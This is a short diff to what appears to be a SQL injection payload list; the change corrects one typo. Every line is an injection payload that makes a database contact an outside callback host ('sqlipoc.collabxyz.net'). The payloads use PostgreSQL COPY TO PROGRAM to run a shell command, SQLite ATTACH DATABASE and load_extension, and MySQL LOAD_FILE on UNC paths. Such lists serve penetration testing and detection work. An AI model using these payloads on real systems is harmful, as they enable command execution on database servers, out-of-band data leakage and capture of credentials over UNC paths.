@@ -1,4 +1,4 @@
-opy (select '') to program 'nslookup sqlipoc.collabxyz.net' 
+copy (select '') to program 'nslookup sqlipoc.collabxyz.net' 
 ;attach database '//sqlipoc.collabxyz.net/z' as 'z'-- - 
 (SELECT load_extension('//foo')) 
 LOAD_FILE('\\\\sqlipoc.collabxyz.net\\foo') 
